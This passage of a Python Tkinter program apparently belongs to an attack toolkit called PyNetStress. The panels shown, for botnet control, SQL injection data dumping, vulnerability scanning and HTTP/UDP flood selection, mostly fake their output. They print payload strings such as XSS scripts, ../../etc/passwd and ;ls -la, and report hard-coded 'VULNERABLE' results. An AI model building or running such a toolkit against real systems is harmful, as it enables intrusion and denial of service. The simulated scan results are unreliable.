                    self.recon_text.insert(tk.END, f"Expiration Date: {w.expiration_date}\n")
                    self.recon_text.insert(tk.END, f"Name Servers: {w.name_servers}\n")
                except Exception as e:
                    self.recon_text.insert(tk.END, f"WHOIS lookup failed: {str(e)}\n")
                    
            elif tool == "dns":
                try:
                    resolver = dns.resolver.Resolver()
                    
                    try:
                        answers = resolver.resolve(target, 'A')
                        self.recon_text.insert(tk.END, "A Records:\n")
                        for rdata in answers:
                            self.recon_text.insert(tk.END, f"  {rdata.address}\n")
                    except:
                        self.recon_text.insert(tk.END, "No A records found\n")
                    
                    try:
                        answers = resolver.resolve(target, 'MX')
                        self.recon_text.insert(tk.END, "MX Records:\n")
                        for rdata in answers:
                            self.recon_text.insert(tk.END, f"  {rdata.exchange} (priority {rdata.preference})\n")
                    except:
                        self.recon_text.insert(tk.END, "No MX records found\n")
                        
                    try:
                        answers = resolver.resolve(target, 'NS')
                        self.recon_text.insert(tk.END, "NS Records:\n")
                        for rdata in answers:
                            self.recon_text.insert(tk.END, f"  {rdata.target}\n")
                    except:
                        self.recon_text.insert(tk.END, "No NS records found\n")
                        
                except Exception as e:
                    self.recon_text.insert(tk.END, f"DNS enumeration failed: {str(e)}\n")
            
            self.recon_text.insert(tk.END, f"\n=== Scan completed ===\n")
            
        except Exception as e:
            self.recon_text.insert(tk.END, f"\nError: {str(e)}\n")
        finally:
            self.recon_text.configure(state='disabled')
            self.recon_text.see(tk.END)
    
    def connect_irc(self):
        server = self.irc_server.get()
        channel = self.irc_channel.get()
        self.irc_text.configure(state='normal')
        self.irc_text.delete(1.0, tk.END)
        self.irc_text.insert(tk.END, f"Connecting to IRC server: {server}\n")
        self.irc_text.insert(tk.END, f"Joining channel: {channel}\n")
        self.irc_text.insert(tk.END, "Connection established\n")
        self.irc_text.insert(tk.END, f"Bots will connect with prefix: {self.irc_prefix.get()}\n")
        self.irc_text.configure(state='disabled')
        self.irc_text.see(tk.END)
        
        self.simulate_botnet()
    
    def simulate_botnet(self):
        def update_botnet():
            connected = 0
            for i in range(50):
                connected += random.choice([0, 1])
                self.bot_count_label.config(text=str(connected))
                time.sleep(0.1)
        
        threading.Thread(target=update_botnet, daemon=True).start()
    
    def disconnect_irc(self):
        self.irc_text.configure(state='normal')
        self.irc_text.insert(tk.END, "\nDisconnected from IRC server\n")
        self.irc_text.configure(state='disabled')
        self.irc_text.see(tk.END)
        self.bot_count_label.config(text="0")
    
    def send_irc_command(self):
        command = self.irc_command.get()
        if not command:
            return
            
        self.irc_text.configure(state='normal')
        self.irc_text.insert(tk.END, f">> {command}\n")
        
        if command.startswith("!attack"):
            self.irc_text.insert(tk.END, "<< Attack command sent to all bots\n")
            self.cmd_count_label.config(text=str(int(self.cmd_count_label.cget("text")) + 1))
        elif command.startswith("!status"):
            self.irc_text.insert(tk.END, "<< 125 bots online, 43 attacking\n")
        
        self.irc_text.configure(state='disabled')
        self.irc_text.see(tk.END)
        self.irc_command.delete(0, tk.END)
    
    def build_botnet(self):
        self.irc_text.configure(state='normal')
        self.irc_text.insert(tk.END, "Building botnet...\n")
        self.irc_text.insert(tk.END, "Scanning for vulnerable devices...\n")
        
        def simulate_build():
            for i in range(5):
                time.sleep(1)
                self.irc_text.insert(tk.END, f"Found {random.randint(10, 50)} vulnerable devices\n")
                self.irc_text.see(tk.END)
            
            self.irc_text.insert(tk.END, "Botnet built successfully! 237 bots online.\n")
            self.irc_text.see(tk.END)
            self.bot_count_label.config(text="237")
        
        threading.Thread(target=simulate_build, daemon=True).start()
        self.irc_text.configure(state='disabled')
    
    def test_sqli(self):
        target = self.sql_target.get()
        param = self.sql_param.get()
        
        self.sql_text.configure(state='normal')
        self.sql_text.delete(1.0, tk.END)
        self.sql_text.insert(tk.END, f"Testing {target} for SQL injection vulnerabilities...\n")
        
        def simulate_sqli():
            time.sleep(1)
            self.sql_text.insert(tk.END, "Testing with single quote: Vulnerable\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Testing with UNION SELECT: Vulnerable\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Testing with time-based payload: Vulnerable\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Target is vulnerable to SQL injection!\n")
            self.sql_text.see(tk.END)
        
        threading.Thread(target=simulate_sqli, daemon=True).start()
        self.sql_text.configure(state='disabled')
    
    def extract_database(self):
        self.sql_text.configure(state='normal')
        self.sql_text.insert(tk.END, "Extracting database information...\n")
        
        def simulate_extract():
            time.sleep(1)
            self.sql_text.insert(tk.END, "Current database: webapp_db\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Database user: webapp_user\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Database version: MySQL 8.0.26\n")
            self.sql_text.see(tk.END)
        
        threading.Thread(target=simulate_extract, daemon=True).start()
        self.sql_text.configure(state='disabled')
    
    def extract_tables(self):
        self.sql_text.configure(state='normal')
        self.sql_text.insert(tk.END, "Extracting table information...\n")
        
        def simulate_tables():
            time.sleep(1)
            self.sql_text.insert(tk.END, "Tables in database:\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- users\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- products\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- orders\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- payments\n")
            self.sql_text.see(tk.END)
        
        threading.Thread(target=simulate_tables, daemon=True).start()
        self.sql_text.configure(state='disabled')
    
    def extract_columns(self):
        self.sql_text.configure(state='normal')
        self.sql_text.insert(tk.END, "Extracting column information...\n")
        
        def simulate_columns():
            time.sleep(1)
            self.sql_text.insert(tk.END, "Columns in users table:\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- id (int)\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- username (varchar)\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- password (varchar)\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "- email (varchar)\n")
            self.sql_text.see(tk.END)
        
        threading.Thread(target=simulate_columns, daemon=True).start()
        self.sql_text.configure(state='disabled')
    
    def dump_data(self):
        self.sql_text.configure(state='normal')
        self.sql_text.insert(tk.END, "Dumping data from users table...\n")
        
        def simulate_dump():
            time.sleep(1)
            self.sql_text.insert(tk.END, "1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@example.com\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "2 | user1 | 5f4dcc3b5aa765d61d8327deb882cf99 | user1@example.com\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "3 | user2 | 5f4dcc3b5aa765d61d8327deb882cf99 | user2@example.com\n")
            self.sql_text.see(tk.END)
        
        threading.Thread(target=simulate_dump, daemon=True).start()
        self.sql_text.configure(state='disabled')
    
    def run_sqlmap(self):
        self.sql_text.configure(state='normal')
        self.sql_text.insert(tk.END, "Running SQLMap automation...\n")
        

        def simulate_sqlmap():
            time.sleep(1)
            self.sql_text.insert(tk.END, "SQLMap identified the following injection points:\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "---\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Parameter: id\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Type: boolean-based blind\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Title: MySQL AND boolean-based blind - WHERE or HAVING clause\n")
            time.sleep(0.5)
            self.sql_text.insert(tk.END, "Payload: id=1 AND 2947=2947\n")
            self.sql_text.see(tk.END)
        
        threading.Thread(target=simulate_sqlmap, daemon=True).start()
        self.sql_text.configure(state='disabled')
    
    def scan_vulnerabilities(self):
        target = self.exploit_target.get()
        
        self.exploit_text.configure(state='normal')
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, f"Scanning {target} for common vulnerabilities...\n")
        

        def simulate_scan():
            time.sleep(1)
            self.exploit_text.insert(tk.END, "Checking for SQL injection... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Checking for XSS... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Checking for CSRF... NOT VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Checking for file inclusion... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Checking for command injection... NOT VULNERABLE\n")
            self.exploit_text.see(tk.END)
        
        threading.Thread(target=simulate_scan, daemon=True).start()
        self.exploit_text.configure(state='disabled')
    
    def check_xss(self):
        target = self.exploit_target.get()
        
        self.exploit_text.configure(state='normal')
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, f"Testing {target} for XSS vulnerabilities...\n")
        

        def simulate_xss():
            time.sleep(1)
            self.exploit_text.insert(tk.END, "Testing with <script>alert('XSS')</script>... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Testing with <img src=x onerror=alert('XSS')>... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Target is vulnerable to XSS!\n")
            self.exploit_text.see(tk.END)
        
        threading.Thread(target=simulate_xss, daemon=True).start()
        self.exploit_text.configure(state='disabled')
    
    def check_csrf(self):
        target = self.exploit_target.get()
        
        self.exploit_text.configure(state='normal')
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, f"Testing {target} for CSRF vulnerabilities...\n")
        

        def simulate_csrf():
            time.sleep(1)
            self.exploit_text.insert(tk.END, "Checking for anti-CSRF tokens... NOT FOUND\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Testing CSRF on form submission... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Target is vulnerable to CSRF!\n")
            self.exploit_text.see(tk.END)
        
        threading.Thread(target=simulate_csrf, daemon=True).start()
        self.exploit_text.configure(state='disabled')
    
    def check_file_inclusion(self):
        target = self.exploit_target.get()
        
        self.exploit_text.configure(state='normal')
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, f"Testing {target} for file inclusion vulnerabilities...\n")
        

        def simulate_file_inc():
            time.sleep(1)
            self.exploit_text.insert(tk.END, "Testing with ../../etc/passwd... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Testing with php://filter... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Target is vulnerable to file inclusion!\n")
            self.exploit_text.see(tk.END)
        
        threading.Thread(target=simulate_file_inc, daemon=True).start()
        self.exploit_text.configure(state='disabled')
    
    def check_command_injection(self):
        target = self.exploit_target.get()
        
        self.exploit_text.configure(state='normal')
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, f"Testing {target} for command injection vulnerabilities...\n")
        

        def simulate_cmd_inj():
            time.sleep(1)
            self.exploit_text.insert(tk.END, "Testing with ;ls -la... NOT VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Testing with | dir... NOT VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Target is not vulnerable to command injection.\n")
            self.exploit_text.see(tk.END)
        
        threading.Thread(target=simulate_cmd_inj, daemon=True).start()
        self.exploit_text.configure(state='disabled')
    
    def full_scan(self):
        target = self.exploit_target.get()
        
        self.exploit_text.configure(state='normal')
        self.exploit_text.delete(1.0, tk.END)
        self.exploit_text.insert(tk.END, f"Running full vulnerability scan on {target}...\n")
        

        def simulate_full_scan():
            time.sleep(1)
            self.exploit_text.insert(tk.END, "Scanning for SQL injection... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Scanning for XSS... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Scanning for CSRF... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Scanning for file inclusion... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Scanning for command injection... NOT VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Scanning for insecure cookies... VULNERABLE\n")
            time.sleep(0.5)
            self.exploit_text.insert(tk.END, "Scan complete. 5 vulnerabilities found.\n")
            self.exploit_text.see(tk.END)
        
        threading.Thread(target=simulate_full_scan, daemon=True).start()
        self.exploit_text.configure(state='disabled')
    
    def on_method_selected(self, event):
        method = self.method_list.get()
        self.update_method_description()
        

        if method == "HTTP Flood":
            self.http_frame.pack(fill='x', pady=5)
            self.udp_frame.pack_forget()
        elif method == "UDP Flood":
            self.http_frame.pack_forget()
            self.udp_frame.pack(fill='x', pady=5)
        else:
            self.http_frame.pack_forget()
            self.udp_frame.pack_forget()
    
    def update_method_description(self):
        method = self.method_list.get()
        description = self.method_descriptions.get(method, "No description available")
        
        self.method_text.configure(state='normal')
        self.method_text.delete(1.0, tk.END)
        self.method_text.insert(tk.END, f"Method: {method}\n\n")
        self.method_text.insert(tk.END, description + "\n\n")
        
        if method == "HTTP Flood":
            self.method_text.insert(tk.END, "Technical Details:\n")
            self.method_text.insert(tk.END, "- Layer: Application (7)\n")
            self.method_text.insert(tk.END, "- Protocol: HTTP\n")
            self.method_text.insert(tk.END, "- Effectiveness: High against web servers\n")
        elif method == "UDP Flood":
            self.method_text.insert(tk.END, "Technical Details:\n")
            self.method_text.insert(tk.END, "- Layer: Transport (4)\n")
            self.method_text.insert(tk.END, "- Protocol: UDP\n")
            self.method_text.insert(tk.END, "- Effectiveness: High for bandwidth consumption\n")
        elif method == "Mixed Attack":
            self.method_text.insert(tk.END, "Technical Details:\n")
            self.method_text.insert(tk.END, "- Layer: Multiple (3, 4, 7)\n")
            self.method_text.insert(tk.END, "- Protocol: Multiple\n")
            self.method_text.insert(tk.END, "- Effectiveness: Very high, combines multiple vectors\n")
        
        self.method_text.configure(state='disabled')
    
    def change_theme(self, event=None):
        self.current_theme = self.theme_var.get()
        self.setup_styles()
        self.log(f"Theme changed to {self.current_theme}")
    
    def apply_settings(self):
        self.log("Settings applied")
        messagebox.showinfo("Settings", "Settings have been applied successfully")
    
    def restore_defaults(self):
        self.max_bots_var.set(10000)
        self.max_threads_var.set(500)
        self.max_duration_var.set(300)
        self.log("Settings restored to defaults")
        messagebox.showinfo("Settings", "Default settings restored")
    
    def test_network(self):
        self.log("Testing network connection...")
        
        def run_test():
            try:
                st = speedtest.Speedtest()
                st.get_best_server()
                download = st.download() / 1_000_000  
                upload = st.upload() / 1_000_000  
                
                self.log(f"Network test: Download: {download:.2f} Mbps, Upload: {upload:.2f} Mbps")
                messagebox.showinfo("Network Test", 
                                  f"Download: {download:.2f} Mbps\nUpload: {upload:.2f} Mbps")
            except Exception as e:
                self.log(f"Network test failed: {str(e)}", "ERROR")
                messagebox.showerror("Network Test", f"Test failed: {str(e)}")
        
        threading.Thread(target=run_test, daemon=True).start()
    
    def monitor_performance(self):
        self.cpu_usage = psutil.cpu_percent()
        

        memory = psutil.virtual_memory()
        self.memory_usage = memory.percent
        

        current_stats = psutil.net_io_counters()
        elapsed = time.time() - self.last_status_update if self.last_status_update > 0 else 1
        bytes_sent = current_stats.bytes_sent - self.start_network_stats.bytes_sent
        bytes_recv = current_stats.bytes_recv - self.start_network_stats.bytes_recv
        self.network_usage = (bytes_sent + bytes_recv) / elapsed / 1024  # KB/s
        
        self.start_network_stats = current_stats
        

        try:
            self.cpu_label.config(text=f"{self.cpu_usage:.1f}%")
            self.memory_label.config(text=f"{self.memory_usage:.1f}%")
            self.network_label.config(text=f"{self.network_usage:.1f} KB/s")
        except:
            pass
        

        if self.running and self.autostop_cpu_var.get() and self.cpu_usage > self.cpu_threshold_var.get():
            self.log(f"CPU usage too high ({self.cpu_usage}%), stopping attack", "WARNING")
            self.stop_attack()
        

        self.root.after(1000, self.monitor_performance)

if __name__ == "__main__":

    root = tk.Tk()
    app = PyNetStress(root)
    root.mainloop()
